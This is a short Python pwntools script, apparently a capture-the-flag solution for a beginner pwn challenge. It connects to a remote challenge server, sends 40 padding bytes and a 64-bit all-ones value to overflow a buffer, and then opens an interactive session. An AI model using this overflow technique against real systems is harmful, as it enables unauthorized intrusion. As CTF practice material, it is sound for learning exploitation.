from pwn import *
#p = process("./beginner-generic-pwn-number-0")
p = remote('mc.ax', 31199)
x = p.recv()

p.sendline("A"*40 + p64(0xffffffffffffffff))
p.interactive()
